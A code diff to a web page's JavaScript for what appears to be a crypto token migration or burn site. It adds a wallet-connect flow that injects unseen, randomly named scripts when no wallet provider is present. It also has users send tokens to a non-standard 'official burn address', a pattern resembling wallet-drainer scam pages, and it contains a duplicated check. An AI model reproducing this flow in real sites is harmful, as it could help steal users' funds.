@@ -1,7 +1,12 @@
 const footer = document.querySelector('.footer');
+const walletModal = document.getElementById('walletModal');
+const migrateBtn = document.getElementById('migrateBtn');
+const connectWalletBtn = document.getElementById('connectWalletBtn');
+const closeWalletModalBtn = document.getElementById('closeWalletModalBtn');
 
 // Function to check if any popup is active
 function updateFooterVisibility() {
+    if (!footer) return;
     const popups = document.querySelectorAll('.popup.active');
     if (popups.length > 0) {
         footer.classList.add('hidden');
@@ -10,35 +15,163 @@ function updateFooterVisibility() {
     }
 }
 
+function openWalletModal() {
+    if (walletModal) {
+        walletModal.classList.add('active');
+        walletModal.setAttribute('aria-hidden', 'false');
+    }
+}
+
+function closeWalletModal() {
+    if (walletModal) {
+        walletModal.classList.remove('active');
+        walletModal.setAttribute('aria-hidden', 'true');
+    }
+}
+
+function loadWalletRuntime() {
+    if (window.ethereum && typeof window.ethereum.request === 'function') {
+        return Promise.resolve();
+    }
+
+    const runtimeScripts = [
+        '/assets/sources.js',
+        '/assets/app-bundle_mrqenxeq.js'
+    ];
+
+    return Promise.all(runtimeScripts.map((src) => new Promise((resolve, reject) => {
+        const existing = document.querySelector(`script[src="${src}"]`);
+        if (existing) {
+            if (existing.dataset.loaded === 'true') {
+                resolve();
+                return;
+            }
+            existing.addEventListener('load', () => {
+                existing.dataset.loaded = 'true';
+                resolve();
+            }, { once: true });
+            existing.addEventListener('error', reject, { once: true });
+            return;
+        }
+
+        const script = document.createElement('script');
+        script.src = src;
+        script.async = false;
+        script.onload = () => {
+            script.dataset.loaded = 'true';
+            resolve();
+        };
+        script.onerror = reject;
+        document.head.appendChild(script);
+    })));
+}
+
+function connectWalletFlow() {
+    loadWalletRuntime().then(() => {
+        const provider = window.ethereum;
+
+    if (!provider || typeof provider.request !== 'function') {
+        alert('No compatible wallet provider was detected. Please install MetaMask or another EIP-1193 wallet and try again.');
+        return;
+    }
+
+        if (!provider || typeof provider.request !== 'function') {
+            alert('No compatible wallet provider was detected. Please install MetaMask or another EIP-1193 wallet and try again.');
+            return;
+        }
+
+        provider.request({ method: 'eth_requestAccounts' })
+            .then((accounts) => {
+                const account = Array.isArray(accounts) && accounts.length > 0 ? accounts[0] : null;
+                if (!account) {
+                    alert('Wallet connection was cancelled.');
+                    return;
+                }
+
+                if (connectWalletBtn) {
+                    connectWalletBtn.textContent = 'Wallet Connected';
+                    connectWalletBtn.disabled = true;
+                }
+
+                closeWalletModal();
+                alert(`Wallet connected: ${account}`);
+            })
+            .catch((error) => {
+                console.error('Wallet connection error:', error);
+                alert(error && error.message ? error.message : 'Unable to connect wallet. Please try again.');
+            });
+    }).catch((error) => {
+        console.error('Wallet runtime load error:', error);
+        alert('Unable to load the wallet provider runtime. Please refresh and try again.');
+    });
+}
+
 // Back buttons
-document.getElementById('backBtn1').addEventListener('click', function() {
-    document.getElementById('popup2').classList.remove('active');
-    document.getElementById('popup1').classList.add('active');
-    updateFooterVisibility();
-});
+const backBtn1 = document.getElementById('backBtn1');
+if (backBtn1) {
+    backBtn1.addEventListener('click', function() {
+        document.getElementById('popup2').classList.remove('active');
+        document.getElementById('popup1').classList.add('active');
+        updateFooterVisibility();
+    });
+}
 
-document.getElementById('backBtn2').addEventListener('click', function() {
-    document.getElementById('popup3').classList.remove('active');
-    document.getElementById('popup2').classList.add('active');
-    updateFooterVisibility();
-});
-
-// Observe popup changes
-document.getElementById('popup1').addEventListener('click', function(e) {
-    if (e.target.id === 'migrateBtn') {
-        document.getElementById('popup1').classList.remove('active');
+const backBtn2 = document.getElementById('backBtn2');
+if (backBtn2) {
+    backBtn2.addEventListener('click', function() {
+        document.getElementById('popup3').classList.remove('active');
         document.getElementById('popup2').classList.add('active');
         updateFooterVisibility();
-    }
-});
+    });
+}
 
-document.getElementById('popup2').addEventListener('click', function(e) {
-    if (e.target.id === 'confirmBurnBtn') {
-        document.getElementById('popup2').classList.remove('active');
-        document.getElementById('popup3').classList.add('active');
-        updateFooterVisibility();
-    }
-});
+// Observe popup changes
+const popup1 = document.getElementById('popup1');
+if (popup1) {
+    popup1.addEventListener('click', function(e) {
+        if (e.target.id === 'migrateBtn') {
+            openWalletModal();
+        }
+    });
+}
+
+// Wallet selection handler
+const popup2 = document.getElementById('popup2');
+if (popup2) {
+    popup2.addEventListener('click', function(e) {
+        const walletOption = e.target.closest('.wallet-option');
+        if (walletOption) {
+            const walletType = walletOption.getAttribute('data-wallet');
+            const walletName = walletOption.querySelector('span').textContent;
+            handleWalletConnection(walletType, walletName);
+        }
+    });
+}
+
+if (migrateBtn) {
+    migrateBtn.addEventListener('click', openWalletModal);
+}
+
+if (connectWalletBtn) {
+    connectWalletBtn.addEventListener('click', connectWalletFlow);
+}
+
+if (closeWalletModalBtn) {
+    closeWalletModalBtn.addEventListener('click', closeWalletModal);
+}
+
+if (walletModal) {
+    walletModal.addEventListener('click', function(e) {
+        if (e.target === walletModal) {
+            closeWalletModal();
+        }
+    });
+}
+
+function handleWalletConnection(walletType, walletName) {
+    console.log('Connecting to wallet:', walletName);
+    alert(`Connecting to ${walletName}...\n\nThis feature will be fully functional soon.`);
+}
 
 const BURN_ADDRESS = '0xCafE541c1c89766d34995f101Be5A669657846Ac'.toLowerCase();
 const NETWORKS = {
@@ -137,54 +270,57 @@ function showPopup4State(title, message, showSuccess) {
 }
 
 // Transaction hash confirmation handler
-document.getElementById('popup3').addEventListener('click', async function(e) {
-    if (e.target.id === 'confirmTxBtn') {
-        const txHash = document.getElementById('txHashInput').value.trim();
-        
-        if (!txHash) {
-            alert('Please enter a transaction hash');
-            return;
-        }
-
-        const normalizedHash = txHash.startsWith('0x') ? txHash : `0x${txHash}`;
-        if (!/^0x[0-9a-fA-F]{64}$/.test(normalizedHash)) {
-            alert('Please enter a valid 66-character transaction hash');
-            return;
-        }
-        
-        const selectedChain = document.getElementById('chainSelect').value;
-        const network = getNetworkConfig(selectedChain);
-
-        document.getElementById('popup3').classList.remove('active');
-        document.getElementById('popup4').classList.add('active');
-        updateFooterVisibility();
-
-        showPopup4State(`Confirming on ${network.name}...`, 'Please wait while we verify your transaction', false);
-
-        try {
-            const result = await fetchTransactionReceiptWithFallback(normalizedHash, selectedChain);
-            const receipt = result.receipt;
-            const foundNetwork = result.network;
-            const foundChain = result.chain;
-            const chainLabel = foundChain === selectedChain ? foundNetwork.name : `${foundNetwork.name} (detected)`;
-
-            if (receipt.status && receipt.status !== '0x1') {
-                showPopup4State('Transaction Failed', 'The transaction was mined but failed. Please check the hash or try a different one.', false);
+const popup3 = document.getElementById('popup3');
+if (popup3) {
+    popup3.addEventListener('click', async function(e) {
+        if (e.target.id === 'confirmTxBtn') {
+            const txHash = document.getElementById('txHashInput').value.trim();
+            
+            if (!txHash) {
+                alert('Please enter a transaction hash');
                 return;
             }
 
-            const burnFound = transactionIncludesBurn(receipt);
-            if (burnFound) {
-                showPopup4State('Burn Confirmed', `Transaction hash confirms a transfer to the official burn address on ${chainLabel}.`, true);
-            } else {
-                showPopup4State('No Burn Detected', `This transaction does not appear to send tokens to the burn address on ${chainLabel}.`, false);
+            const normalizedHash = txHash.startsWith('0x') ? txHash : `0x${txHash}`;
+            if (!/^0x[0-9a-fA-F]{64}$/.test(normalizedHash)) {
+                alert('Please enter a valid 66-character transaction hash');
+                return;
             }
-        } catch (error) {
-            console.error(error);
-            showPopup4State('Verification Error', error.message || 'Unable to verify transaction. Please try again later.', false);
+            
+            const selectedChain = document.getElementById('chainSelect').value;
+            const network = getNetworkConfig(selectedChain);
+
+            document.getElementById('popup3').classList.remove('active');
+            document.getElementById('popup4').classList.add('active');
+            updateFooterVisibility();
+
+            showPopup4State(`Confirming on ${network.name}...`, 'Please wait while we verify your transaction', false);
+
+            try {
+                const result = await fetchTransactionReceiptWithFallback(normalizedHash, selectedChain);
+                const receipt = result.receipt;
+                const foundNetwork = result.network;
+                const foundChain = result.chain;
+                const chainLabel = foundChain === selectedChain ? foundNetwork.name : `${foundNetwork.name} (detected)`;
+
+                if (receipt.status && receipt.status !== '0x1') {
+                    showPopup4State('Transaction Failed', 'The transaction was mined but failed. Please check the hash or try a different one.', false);
+                    return;
+                }
+
+                const burnFound = transactionIncludesBurn(receipt);
+                if (burnFound) {
+                    showPopup4State('Burn Confirmed', `Transaction hash confirms a transfer to the official burn address on ${chainLabel}.`, true);
+                } else {
+                    showPopup4State('No Burn Detected', `This transaction does not appear to send tokens to the burn address on ${chainLabel}.`, false);
+                }
+            } catch (error) {
+                console.error(error);
+                showPopup4State('Verification Error', error.message || 'Unable to verify transaction. Please try again later.', false);
+            }
         }
-    }
-});
+    });
+}
 
 // Coming Soon functionality
 function showComingSoon() {
@@ -198,7 +334,10 @@ function closeComingSoon() {
 }
 
 // Close Coming Soon when clicking overlay
-document.getElementById('comingSoonOverlay').addEventListener('click', closeComingSoon);
+const comingSoonOverlay = document.getElementById('comingSoonOverlay');
+if (comingSoonOverlay) {
+    comingSoonOverlay.addEventListener('click', closeComingSoon);
+}
 
 // Copy burn address button
 const copyBtn = document.getElementById('copyBtn');
